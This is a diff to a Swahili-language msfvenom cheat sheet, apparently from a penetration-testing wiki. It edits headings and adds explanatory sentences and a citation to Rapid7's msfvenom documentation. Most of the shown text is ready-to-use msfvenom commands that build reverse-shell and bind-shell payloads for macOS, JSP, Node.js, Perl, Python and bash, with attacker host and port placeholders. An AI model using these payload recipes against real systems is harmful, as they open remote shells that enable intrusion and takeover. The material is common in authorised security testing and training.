@@ -1,6 +1,4 @@
-# MSFVenom - CheatSheet
-
-{{#include ../../banners/hacktricks-training.md}}
+# MSFVenom - Mwongozo wa Haraka
 
 ---
 
@@ -8,14 +6,16 @@
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Unaweza pia kutumia `-a` kubainisha architecture au `--platform`
+Tumia `-a` kuchagua payload architecture na `--platform` kuchagua target platform yake.<sup>[[1]](#references)</sup>
 
-## Kuorodhesha
+## Orodha
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Vigezo vya kawaida wakati wa kuunda shellcode
+Amri hizi huorodhesha moduli za payload na encoder zinazopatikana katika framework iliyosakinishwa.<sup>[[1]](#references)</sup>
+
+## Parameta za kawaida wakati wa kuunda shellcode
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+Flags zilizoonyeshwa hapa huchagua bad characters, output format, encoder, na encoding iterations.<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -79,7 +81,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Payloads za Web**
+## **Payloads za Msingi wa Wavuti**
 
 ### **PHP**
 
@@ -111,7 +113,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payload za Lugha za Script**
+## **Payloads za Lugha ya Script**
 
 ### **Perl**
 ```bash
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [Jinsi ya kutumia msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
